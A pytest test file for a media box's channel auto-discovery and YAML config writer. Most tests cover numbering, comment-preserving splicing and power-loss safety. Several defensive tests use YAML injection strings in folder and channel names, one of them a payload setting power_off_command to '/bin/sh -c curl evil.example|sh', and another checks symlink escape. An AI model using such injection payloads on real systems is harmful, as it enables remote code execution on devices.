import logging
import os

import pytest
import yaml

from retrobox.autochannels import (
    MARKER,
    apply_auto_channels,
    discover_new_channels,
    write_channels,
)
from retrobox.config import (
    DEFAULT_POWER_OFF_COMMAND,
    INSTALL_ROOT,
    ChannelConfig,
    ConfigError,
    config_from_dict,
    load_config,
)
from tests.helpers import make_show


def _media(tmp_path, *shows, empty=()):
    root = tmp_path / "media"
    root.mkdir(exist_ok=True)
    for name in shows:
        make_show(root, name, 3)
    for name in empty:
        (root / name).mkdir(parents=True, exist_ok=True)
    return root


# -- discovery -------------------------------------------------------------
def test_finds_folders_that_have_no_channel(tmp_path):
    root = _media(tmp_path, "sitcoms", "movies")
    config = config_from_dict({"media_root": str(root), "auto_channels": True})
    # media_root discovery already claimed both, so nothing is "new".
    assert discover_new_channels(config) == []

    make_show(root, "talk shows", 2)
    found = discover_new_channels(config)
    assert [(c.number, c.name) for c in found] == [(4, "Talk Shows")]


def test_names_are_tidied_up(tmp_path):
    root = _media(tmp_path, "late_night_tv", "music-videos")
    config = config_from_dict(
        {"channels": [{"number": 2, "name": "Keep", "path": str(tmp_path / "other")}],
         "media_root": str(root), "auto_channels": True}
    )
    (tmp_path / "other").mkdir(exist_ok=True)
    names = [c.name for c in discover_new_channels(config)]
    assert names == ["Late Night Tv", "Music Videos"]


def test_numbering_continues_past_existing_channels(tmp_path):
    root = _media(tmp_path, "sitcoms")
    config = config_from_dict(
        {
            "channels": [
                {"number": 2, "name": "A", "path": str(root / "sitcoms")},
                {"number": 9, "name": "B", "path": str(root / "sitcoms")},
            ],
            "media_root": str(root),
            "auto_channels": True,
        }
    )
    make_show(root, "movies", 2)
    assert discover_new_channels(config)[0].number == 10


def test_empty_folders_are_skipped(tmp_path):
    root = _media(tmp_path, "sitcoms", empty=("nothing_here", "also_empty"))
    config = config_from_dict(
        {"channels": [{"number": 2, "name": "A", "path": str(root / "sitcoms")}],
         "media_root": str(root), "auto_channels": True}
    )
    assert discover_new_channels(config) == []


def test_folders_with_only_non_video_files_are_skipped(tmp_path):
    root = _media(tmp_path, "sitcoms")
    junk = root / "subtitles_only"
    junk.mkdir()
    (junk / "notes.txt").write_text("nope")
    (junk / "cover.jpg").write_bytes(b"\x00")
    config = config_from_dict(
        {"channels": [{"number": 2, "name": "A", "path": str(root / "sitcoms")}],
         "media_root": str(root), "auto_channels": True}
    )
    assert discover_new_channels(config) == []


def test_existing_channels_are_never_touched(tmp_path):
    root = _media(tmp_path, "sitcoms", "movies")
    config = config_from_dict(
        {
            # A deliberate name and number on a folder auto-discovery would
            # otherwise have called "Sitcoms" on channel 2.
            "channels": [{"number": 47, "name": "MY CHANNEL",
                          "path": str(root / "sitcoms")}],
            "media_root": str(root),
            "auto_channels": True,
        }
    )
    found = discover_new_channels(config)
    assert [(c.number, c.name) for c in found] == [(48, "Movies")]
    # The hand-set one is untouched.
    assert (config.channels[0].number, config.channels[0].name) == (47, "MY CHANNEL")


def test_daypart_folders_do_not_become_their_own_channel(tmp_path):
    root = _media(tmp_path, "sitcoms", "after_dark")
    config = config_from_dict(
        {
            "channels": [{
                "number": 2, "name": "A", "path": str(root / "sitcoms"),
                "dayparts": [{"from": "22:00", "to": "02:00",
                              "path": str(root / "after_dark")}],
            }],
            "media_root": str(root),
            "auto_channels": True,
        }
    )
    assert discover_new_channels(config) == []


def test_discovery_is_stable_across_runs(tmp_path):
    root = _media(tmp_path, "b_show", "a_show", "c_show")
    config = config_from_dict(
        {"channels": [{"number": 2, "name": "X", "path": str(tmp_path / "x")}],
         "media_root": str(root), "auto_channels": True}
    )
    (tmp_path / "x").mkdir(exist_ok=True)
    first = [(c.number, c.name) for c in discover_new_channels(config)]
    second = [(c.number, c.name) for c in discover_new_channels(config)]
    assert first == second == [(3, "A Show"), (4, "B Show"), (5, "C Show")]


def test_off_by_default(tmp_path):
    root = _media(tmp_path, "sitcoms")
    config = config_from_dict(
        {"channels": [{"number": 2, "name": "A", "path": str(root / "sitcoms")}],
         "media_root": str(root)}
    )
    assert config.auto_channels is False
    merged, added = apply_auto_channels(config, None)
    assert added == [] and merged is config


def test_missing_media_root_is_not_fatal(tmp_path):
    config = config_from_dict(
        {"channels": [{"number": 2, "name": "A", "path": str(tmp_path)}],
         "media_root": str(tmp_path / "gone"), "auto_channels": True}
    )
    assert discover_new_channels(config) == []


def test_no_media_root_configured_is_not_fatal(tmp_path):
    make_show(tmp_path, "a", 1)
    config = config_from_dict(
        {"channels": [{"number": 2, "name": "A", "path": str(tmp_path / "a")}],
         "auto_channels": True}
    )
    assert discover_new_channels(config) == []


# -- writing back ----------------------------------------------------------
def _config_file(tmp_path, body):
    path = tmp_path / "config.yaml"
    path.write_text(body)
    return path


def test_new_channels_are_spliced_into_the_channels_block(tmp_path):
    root = _media(tmp_path, "sitcoms", "movies")
    path = _config_file(
        tmp_path,
        f"""# a comment at the top
media_root: {root}
auto_channels: true

channels:
  - number: 2
    name: "Sitcoms"
    path: {root / 'sitcoms'}

tune_in: random     # trailing comment
""",
    )
    config = load_config(path)
    merged, added = apply_auto_channels(config, path)

    assert [c.name for c in added] == ["Movies"]
    text = path.read_text()
    # Comments survive - the whole point of splicing rather than re-dumping.
    assert "# a comment at the top" in text
    assert "tune_in: random     # trailing comment" in text
    assert MARKER in text
    # ...and it still parses, with both channels present.
    reloaded = load_config(path)
    assert [(c.number, c.name) for c in reloaded.channels] == [
        (2, "Sitcoms"), (3, "Movies"),
    ]


def test_writing_is_idempotent_across_restarts(tmp_path):
    root = _media(tmp_path, "sitcoms", "movies")
    path = _config_file(
        tmp_path,
        f'media_root: {root}\nauto_channels: true\nchannels:\n'
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n',
    )
    apply_auto_channels(load_config(path), path)
    first = path.read_text()

    # Second start: Movies is now a real channel, so nothing more to add.
    merged, added = apply_auto_channels(load_config(path), path)
    assert added == []
    assert path.read_text() == first, "a second run must not duplicate anything"


def test_creates_a_channels_block_when_there_isnt_one(tmp_path):
    from retrobox.config import ChannelConfig

    root = _media(tmp_path, "sitcoms")
    path = _config_file(tmp_path, f"media_root: {root}\nauto_channels: true\n")
    write_channels(path, [ChannelConfig(number=5, name="Movies",
                                        path=root / "movies")])
    text = path.read_text()
    assert "channels:" in text and "Movies" in text
    assert load_config(path).auto_channels is True, "the rest of the file survives"


def test_media_root_only_config_has_nothing_left_to_discover(tmp_path):
    # media_root discovery already claims every folder at parse time, so
    # auto_channels is a no-op there - it exists for explicit channel lists.
    root = _media(tmp_path, "sitcoms", "movies")
    path = _config_file(tmp_path, f"media_root: {root}\nauto_channels: true\n")
    _merged, added = apply_auto_channels(load_config(path), path)
    assert added == []


def test_write_stops_at_the_next_top_level_key(tmp_path):
    root = _media(tmp_path, "sitcoms")
    path = _config_file(
        tmp_path,
        f"""media_root: {root}
auto_channels: true
channels:
  - number: 2
    name: "Sitcoms"
    path: {root / 'sitcoms'}
tune_in: broadcast
start_channel: 2
""",
    )
    make_show(root, "movies", 2)
    apply_auto_channels(load_config(path), path)
    lines = path.read_text().splitlines()
    # The new entry must land inside the list, above tune_in - not after it.
    assert lines.index("tune_in: broadcast") > lines.index("  - number: 3")
    assert load_config(path).tune_in == "broadcast"


def test_unwritable_config_still_yields_working_channels(tmp_path, caplog):
    root = _media(tmp_path, "sitcoms", "movies")
    config = config_from_dict(
        {"channels": [{"number": 2, "name": "A", "path": str(root / "sitcoms")}],
         "media_root": str(root), "auto_channels": True}
    )
    # A directory where a file should be: writing raises OSError.
    bad = tmp_path / "nope"
    bad.mkdir()
    with caplog.at_level(logging.WARNING, logger="retrobox.autochannels"):
        merged, added = apply_auto_channels(config, bad)
    assert [c.name for c in added] == ["Movies"]
    assert len(merged.channels) == 2, "the session still gets the channel"
    assert any(r.levelno == logging.WARNING for r in caplog.records), (
        "a config the box cannot write is worth saying out loud"
    )


def test_write_channels_with_nothing_to_add_is_a_no_op(tmp_path):
    path = _config_file(tmp_path, "channels:\n  - number: 2\n    name: A\n    path: /x\n")
    before = path.read_text()
    write_channels(path, [])
    assert path.read_text() == before


# -- surviving the power going off ----------------------------------------
def _staging_litter(directory):
    return sorted(p.name for p in directory.iterdir() if p.name.endswith(".tmp"))


def test_the_original_config_is_kept_the_first_time_channels_are_added(tmp_path):
    root = _media(tmp_path, "sitcoms", "movies")
    original = (
        f'# hand written\nmedia_root: {root}\nauto_channels: true\nchannels:\n'
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
    )
    path = _config_file(tmp_path, original)
    apply_auto_channels(load_config(path), path)

    assert (tmp_path / "config.yaml.bak").read_text() == original
    assert "Movies" in path.read_text(), "and the real write still happened"


def test_a_second_discovery_does_not_overwrite_the_backup(tmp_path):
    root = _media(tmp_path, "sitcoms", "movies")
    original = (
        f'media_root: {root}\nauto_channels: true\nchannels:\n'
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
    )
    path = _config_file(tmp_path, original)
    apply_auto_channels(load_config(path), path)

    # A new folder turns up later and gets written on a second start.
    make_show(root, "cartoons", 2)
    apply_auto_channels(load_config(path), path)

    assert "Cartoons" in path.read_text(), "the second run really did write"
    assert (tmp_path / "config.yaml.bak").read_text() == original, (
        "the backup must still be the file from before automation ever ran"
    )


def test_a_write_that_dies_part_way_leaves_the_config_intact(tmp_path, caplog):
    # The failure this whole change exists for: the box loses power between
    # opening the config and finishing the write. The old file has to survive.
    root = _media(tmp_path, "sitcoms", "movies")
    original = (
        f'media_root: {root}\nauto_channels: true\nchannels:\n'
        f'  - number: 2\n    name: "Sitcoms"\n    path: {root / "sitcoms"}\n'
    )
    path = _config_file(tmp_path, original)

    def power_cut(src, dst):
        raise OSError("power cut")

    with pytest.MonkeyPatch.context() as mp:
        mp.setattr(os, "replace", power_cut)
        with caplog.at_level(logging.WARNING, logger="retrobox.autochannels"):
            merged, added = apply_auto_channels(load_config(path), path)

    assert path.read_text() == original, "the config was truncated or rewritten"
    assert _staging_litter(tmp_path) == [], "a failed write left a temp file behind"
    assert not (tmp_path / "config.yaml.bak").exists(), (
        "a backup that never completed must not be left as the last known good"
    )
    # ...and the box carries on: best effort means the channels still work.
    assert [c.name for c in added] == ["Movies"]
    assert len(merged.channels) == 2
    assert any(r.levelno == logging.WARNING for r in caplog.records)


def test_a_symlink_planted_in_the_media_root_never_becomes_a_channel(tmp_path, caplog):
    """The one that would be written back into config.yaml and kept forever.

    Discovery follows symlinks, and what it finds is persisted, so a link
    dropped in the media root over the file share would become a permanent
    channel pointed at anything the box user owns. The same rule the loader
    applies to a channel folder is applied here, at the moment the folder is
    turned into one.
    """
    root = _media(tmp_path, "sitcoms")
    # Pointed at the installed software, which really does hold a video file -
    # so without the check this folder passes the "has episodes" test and is
    # written into config.yaml as a channel.
    (root / "escape").symlink_to(INSTALL_ROOT / "retrobox" / "assets")
    config = config_from_dict({
        "channels": [{"number": 2, "name": "Sitcoms", "path": str(root / "sitcoms")}],
        "media_root": str(root), "auto_channels": True,
    })

    with caplog.at_level(logging.WARNING, logger="retrobox.autochannels"):
        found = discover_new_channels(config)

    assert found == [], "a symlink out of the media root became a channel"
    assert any("escape" in r.getMessage() for r in caplog.records)


# -- folder names are untrusted input to a file the box parses -------------
#
# Every channel written back here is named and pointed at by a FOLDER NAME
# found under the media root, and anybody on the LAN can create a folder
# there: the dashboard has no password on it and an upload names its own
# folder. So a folder name is attacker-controlled text going into config.yaml,
# which is the file the box reads at every start - the same job netconf.py
# does for a wifi name and webui.py's factory reset does for media_root, and
# the same answer applies. Build the data, hand it to the serialiser.

def _raw(path):
    """The config file as YAML sees it - keys, values, and nothing implied."""
    return yaml.safe_load(path.read_text(encoding="utf-8"))


def _hand_written_config(tmp_path, root):
    """A config of the kind a person edits, with comments worth keeping."""
    return _config_file(
        tmp_path,
        f"""# hand written, and it stays that way
media_root: {root}
auto_channels: true

channels:
  # the one I set up myself
  - number: 2
    name: "Sitcoms"
    path: {root / 'sitcoms'}

tune_in: broadcast     # trailing comment
start_channel: 2
""",
    )


def test_a_folder_name_cannot_inject_a_top_level_key_into_the_config(tmp_path):
    """The remote-code-execution shaped one, and the reason for all of this.

    A folder called ``shows<newline>power_off_command: []`` pasted into the
    file rather than serialised puts that second line at column zero, where it
    is not part of the channel at all - it is a top-level key. And
    ``power_off_command`` is an argv this box really runs, so whoever created
    the folder now decides what "switch off" means. An empty list is the one
    value the loader's whitelist accepts unchanged, so the box quietly loses
    the ability to power itself off and says nothing about it.

    The loader checks the values it parses. This writes the file the loader
    will parse next time, so the check has to be here as well.
    """
    root = _media(tmp_path, "sitcoms")
    make_show(root, "shows\npower_off_command: []", 2)
    path = _hand_written_config(tmp_path, root)

    before = _raw(path)
    apply_auto_channels(load_config(path), path)
    after = _raw(path)

    assert set(after) == set(before), "a folder name added a key to config.yaml"
    assert "power_off_command" not in after
    reloaded = load_config(path)
    assert reloaded.power_off_command == DEFAULT_POWER_OFF_COMMAND
    assert reloaded.power_off_command_refused is None


def test_a_folder_name_cannot_replace_the_lineup_with_one_of_its_own(tmp_path):
    """The same trick aimed at the channels list rather than at a command.

    A second top-level ``channels:`` key wins over the first one, so a single
    folder name can delete every channel on the box - including the ones
    somebody set up by hand.
    """
    root = _media(tmp_path, "sitcoms")
    make_show(root, "shows\nchannels: []", 2)
    path = _hand_written_config(tmp_path, root)

    apply_auto_channels(load_config(path), path)

    numbers = [c.number for c in load_config(path).channels]
    assert 2 in numbers, "the hand-set channel was deleted by a folder name"
    assert len(numbers) == 2


#: Folder names that are legal on any Linux or macOS filesystem - only "/"
#: and NUL are not - and that each break a different part of hand-written
#: YAML. They are all things a person might genuinely call a show, except the
#: ones that are somebody trying it on.
AWKWARD_FOLDER_NAMES = [
    pytest.param('the "good" stuff', id="a double quote closes the name early"),
    pytest.param("shows\nstart_channel: 99", id="a newline opens a new key"),
    pytest.param("news: at ten", id="a colon and a space is a mapping"),
    pytest.param("Films #2", id="a hash starts a comment"),
    pytest.param("- late night", id="a leading dash is a list item"),
    pytest.param("*movies", id="a leading star is an alias"),
    pytest.param("&movies", id="a leading ampersand is an anchor"),
    pytest.param("{movies}", id="braces are a flow mapping"),
    pytest.param("Ünïcodé Kanäle", id="unicode"),
    pytest.param("🎬 movie night", id="an emoji"),
    pytest.param("22:00", id="a name YAML reads back as a number"),
    pytest.param("yes", id="a name YAML reads back as a boolean"),
    pytest.param("null", id="a name YAML reads back as nothing at all"),
    pytest.param("  padded  ", id="leading and trailing spaces"),
    pytest.param("a\tb", id="a tab"),
]


@pytest.mark.parametrize("folder_name", AWKWARD_FOLDER_NAMES)
def test_a_discovered_folder_is_written_back_exactly_as_it_was_found(
    tmp_path, folder_name
):
    """Whatever the folder is called, the config still says what we meant.

    The channel the box runs with this session and the channel the box reads
    back after a restart have to be the same channel. Anything else is a
    lineup that changes when the power goes off.
    """
    root = _media(tmp_path, "sitcoms")
    make_show(root, folder_name, 2)
    path = _hand_written_config(tmp_path, root)

    _merged, added = apply_auto_channels(load_config(path), path)
    assert len(added) == 1, "the awkward folder was not discovered at all"

    reloaded = load_config(path)
    assert [(c.number, c.name, c.path) for c in reloaded.channels] == [
        (2, "Sitcoms", root / "sitcoms"),
        (added[0].number, added[0].name, added[0].path),
    ]


@pytest.mark.parametrize("folder_name", AWKWARD_FOLDER_NAMES)
def test_an_awkward_folder_name_changes_nothing_else_in_the_config(
    tmp_path, folder_name
):
    """One new channel, and not one other thing different.

    This is the assertion that catches the whole class at once: a name that
    escapes its entry does not just corrupt that entry, it edits somebody
    else's settings. And the comments have to survive, because splicing rather
    than re-dumping the document is the only reason they are still there.
    """
    root = _media(tmp_path, "sitcoms")
    make_show(root, folder_name, 2)
    path = _hand_written_config(tmp_path, root)

    before = _raw(path)
    apply_auto_channels(load_config(path), path)
    after = _raw(path)

    assert {k: v for k, v in after.items() if k != "channels"} == {
        k: v for k, v in before.items() if k != "channels"
    }
    assert after["channels"][:1] == before["channels"], (
        "the channel that was already there came back different"
    )
    assert len(after["channels"]) == 2

    text = path.read_text(encoding="utf-8")
    assert "# hand written, and it stays that way" in text
    assert "  # the one I set up myself" in text
    assert "tune_in: broadcast     # trailing comment" in text


#: Names and paths a person can put in by hand or through the dashboard, which
#: never go anywhere near the folder-name tidy-up, so they arrive here raw.
AWKWARD_CHANNEL_NAMES = [
    pytest.param('He said "hello"', id="double quotes"),
    pytest.param("two\nlines", id="a newline"),
    pytest.param("News: at ten", id="a colon and a space"),
    pytest.param("Films #2", id="a hash"),
    pytest.param("- Late Night", id="a leading dash"),
    pytest.param("*Movies", id="a leading star"),
    pytest.param("? Movies", id="a leading question mark"),
    pytest.param("%YAML 1.2", id="a leading percent"),
    pytest.param("Yes", id="reads back as a boolean"),
    pytest.param("22:00", id="reads back as a number"),
    pytest.param("~", id="reads back as nothing at all"),
    pytest.param("name: x\npower_off_command: []", id="an outright injection"),
    pytest.param("🎬 Movie Night", id="an emoji"),
    pytest.param("Ünïcodé", id="unicode"),
]


@pytest.mark.parametrize("name", AWKWARD_CHANNEL_NAMES)
def test_a_channel_name_given_to_the_writer_survives_the_round_trip(tmp_path, name):
    root = _media(tmp_path, "sitcoms")
    folder = root / "sitcoms"
    path = _config_file(tmp_path, "start_channel: 2\n")

    write_channels(path, [ChannelConfig(number=7, name=name, path=folder)])

    reloaded = load_config(path)
    assert [(c.number, c.name, c.path) for c in reloaded.channels] == [
        (7, name, folder)
    ]
    assert reloaded.start_channel == 2, "the rest of the file changed"


@pytest.mark.parametrize("folder_name", AWKWARD_FOLDER_NAMES)
def test_a_channel_path_given_to_the_writer_survives_the_round_trip(
    tmp_path, folder_name
):
    root = _media(tmp_path, "media")
    folder = root / folder_name
    folder.mkdir()
    path = _config_file(tmp_path, "start_channel: 2\n")

    write_channels(path, [ChannelConfig(number=7, name="Fixed", path=folder)])

    reloaded = load_config(path)
    assert [(c.number, c.name, c.path) for c in reloaded.channels] == [
        (7, "Fixed", folder)
    ]


def test_a_flow_style_channels_list_is_never_quietly_emptied(tmp_path):
    """``channels: [{...}]`` on one line is a list this cannot be spliced into.

    The block-finder looks for a line that is exactly ``channels:``, so a flow
    list does not look like a channels block at all and a second ``channels:``
    key gets appended instead. The last key wins, so the channel the customer
    set up disappears from the box. Not persisting is a nuisance; deleting
    somebody's lineup is a support call.
    """
    root = _media(tmp_path, "sitcoms", "movies")
    path = _config_file(
        tmp_path,
        f"channels: [{{number: 2, name: Sitcoms, path: {root / 'sitcoms'}}}]\n",
    )
    before = path.read_text(encoding="utf-8")

    with pytest.raises(ConfigError):
        write_channels(path, [ChannelConfig(number=3, name="Movies",
                                            path=root / "movies")])

    assert path.read_text(encoding="utf-8") == before
    assert [c.number for c in load_config(path).channels] == [2]


def test_a_config_that_cannot_be_written_faithfully_is_left_alone(tmp_path, caplog):
    """And the box still comes up, with the channels working for this session.

    Refusing the write is best-effort in exactly the way an unwritable disk is:
    the lineup is rediscovered at the next start, which costs nothing, and the
    customer's file is still the file they wrote.
    """
    root = _media(tmp_path, "sitcoms", "movies")
    path = _config_file(
        tmp_path,
        f"media_root: {root}\nauto_channels: true\n"
        f"channels: [{{number: 2, name: Sitcoms, path: {root / 'sitcoms'}}}]\n",
    )
    before = path.read_text(encoding="utf-8")

    with caplog.at_level(logging.WARNING, logger="retrobox.autochannels"):
        merged, added = apply_auto_channels(load_config(path), path)

    assert [c.name for c in added] == ["Movies"]
    assert len(merged.channels) == 2, "the session still gets the channel"
    assert path.read_text(encoding="utf-8") == before
    assert any(r.levelno == logging.WARNING for r in caplog.records)


def test_a_folder_name_cannot_hand_itself_a_power_off_command(tmp_path):
    """The injection aimed straight at the argv, through the writer's front door.

    ``power_off_command`` is the one config key that becomes a process this box
    runs as itself, so it is what a name is worth escaping for. The payload is
    written for the quotes that used to be typed by hand around the name: close
    them, put the real key at column zero on the next line, then open a literal
    block scalar so the entry's own ``path:`` line is eaten as text rather than
    left behind as a syntax error. The file that comes out parses perfectly and
    looks ordinary. The box just has a new idea of what "switch off" runs. A
    name is not a place a command can come from, no matter what is in it.
    """
    root = _media(tmp_path, "sitcoms")
    path = _config_file(tmp_path, f"media_root: {root}\n")

    write_channels(path, [ChannelConfig(
        number=3,
        name=(
            'Movies"\n'
            "power_off_command: [/bin/sh, -c, curl evil.example|sh]\n"
            "swallowed: |- #"
        ),
        path=root / "sitcoms",
    )])

    assert "power_off_command" not in _raw(path), (
        "a channel name became a top-level key"
    )
    reloaded = load_config(path)
    assert reloaded.power_off_command == DEFAULT_POWER_OFF_COMMAND
    assert reloaded.power_off_command_refused is None


def test_a_path_that_looks_like_a_comment_is_not_truncated_at_the_hash(tmp_path):
    """``/media/Films #2`` written bare stops being a path at the ``#``.

    YAML reads from an unquoted ``#`` to the end of the line as a comment, so
    the channel comes back pointed at ``/media/Films`` - a folder that may well
    exist and hold something else entirely. Nothing tells the customer; the
    channel just plays the wrong programme after a restart.
    """
    root = _media(tmp_path, "media")
    folder = root / "Films #2"
    folder.mkdir()
    path = _config_file(tmp_path, "start_channel: 2\n")

    write_channels(path, [ChannelConfig(number=3, name="Films", path=folder)])

    assert load_config(path).channels[0].path == folder


def test_a_channels_block_indented_some_other_way_is_matched_not_corrupted(tmp_path):
    """Four spaces is legal YAML and somebody's house style. Follow it.

    Every item of one block sequence has to sit at the same column. Splicing a
    two-space entry under four-space entries is not a list any more, and PyYAML
    says so by refusing to parse the whole file - on a box whose only way back
    is a config it can read.
    """
    root = _media(tmp_path, "sitcoms", "movies")
    path = _config_file(
        tmp_path,
        f"""media_root: {root}
auto_channels: true
channels:
    - number: 2
      name: Sitcoms
      path: {root / 'sitcoms'}
""",
    )

    _merged, added = apply_auto_channels(load_config(path), path)
    assert [c.name for c in added] == ["Movies"]

    reloaded = load_config(path)
    assert [(c.number, c.name) for c in reloaded.channels] == [
        (2, "Sitcoms"), (3, "Movies"),
    ]
    assert "    - number: 3" in path.read_text(encoding="utf-8")


def test_a_channels_list_written_at_the_left_margin_is_matched_too(tmp_path):
    """``channels:`` with its items at column zero is the other legal spelling."""
    root = _media(tmp_path, "sitcoms", "movies")
    path = _config_file(
        tmp_path,
        f"""media_root: {root}
auto_channels: true
channels:
- number: 2
  name: Sitcoms
  path: {root / 'sitcoms'}
""",
    )

    apply_auto_channels(load_config(path), path)

    assert [(c.number, c.name) for c in load_config(path).channels] == [
        (2, "Sitcoms"), (3, "Movies"),
    ]


def test_an_empty_channels_key_is_filled_in_rather_than_duplicated(tmp_path):
    """``channels:`` with nothing under it yet still has to be the list used."""
    root = _media(tmp_path, "sitcoms")
    path = _config_file(tmp_path, "channels:\nstart_channel: 2\n")

    write_channels(path, [ChannelConfig(number=3, name="Movies",
                                        path=root / "sitcoms")])

    reloaded = load_config(path)
    assert [(c.number, c.name) for c in reloaded.channels] == [(3, "Movies")]
    assert reloaded.start_channel == 2


def test_everything_about_a_channel_is_written_not_just_its_first_three_keys(
    tmp_path
):
    """A channel handed to the writer comes back whole.

    Serialising a structure rather than printing three lines means the entry is
    whatever the channel actually is, so a caller cannot silently lose a
    setting by handing over a channel the printf had never heard of.
    """
    root = _media(tmp_path, "sitcoms")
    path = _config_file(tmp_path, "start_channel: 2\n")

    write_channels(path, [ChannelConfig(
        number=4, name="Movies", path=root / "sitcoms",
        shuffle=False, exclude=("trailer",), exclude_seasons=frozenset({0}),
        bumpers=False,
    )])

    channel = load_config(path).channels[0]
    assert (channel.shuffle, channel.bumpers) == (False, False)
    assert channel.exclude == ("trailer",)
    assert channel.exclude_seasons == frozenset({0})


def test_a_config_that_is_not_yaml_at_all_is_never_appended_to(tmp_path):
    """Splicing onto a file nobody can parse cannot be checked, so it is refused.

    The config on the box would already have failed to load, so there is
    nothing to preserve by writing - and a half-understood file is exactly
    where a blind append does the most damage.
    """
    root = _media(tmp_path, "sitcoms")
    path = _config_file(tmp_path, "channels:\n  - number: 2\n   name: bad indent\n")
    before = path.read_text(encoding="utf-8")

    with pytest.raises(ConfigError):
        write_channels(path, [ChannelConfig(number=3, name="Movies",
                                            path=root / "sitcoms")])

    assert path.read_text(encoding="utf-8") == before


def test_a_channel_the_writer_cannot_serialise_does_not_stop_the_box_starting(
    tmp_path, caplog
):
    """The dumper refusing a value must come back as "not saved", not as a crash.

    ``safe_dump`` raises on anything it cannot write plainly, and this runs on
    the start-up path. An exception escaping here is a box that does not come
    up, which on this hardware is a van.
    """
    root = _media(tmp_path, "sitcoms")
    path = _config_file(tmp_path, f"media_root: {root}\nauto_channels: true\n")
    before = path.read_text(encoding="utf-8")

    # A name that is not text at all - the shape of mistake a future caller
    # makes, and the same one configstore's _yamlify exists to head off.
    unwritable = ChannelConfig(number=3, name=object(), path=root / "sitcoms")

    with pytest.raises(ConfigError):
        write_channels(path, [unwritable])
    assert path.read_text(encoding="utf-8") == before

    config = config_from_dict({"media_root": str(root), "auto_channels": True})
    with pytest.MonkeyPatch.context() as mp:
        mp.setattr("retrobox.autochannels.discover_new_channels",
                   lambda _config: [unwritable])
        with caplog.at_level(logging.WARNING, logger="retrobox.autochannels"):
            merged, added = apply_auto_channels(config, path)

    assert added == [unwritable], "the session still gets the channel"
    assert merged.channels[-1] is unwritable
    assert path.read_text(encoding="utf-8") == before
    assert any(r.levelno == logging.WARNING for r in caplog.records)
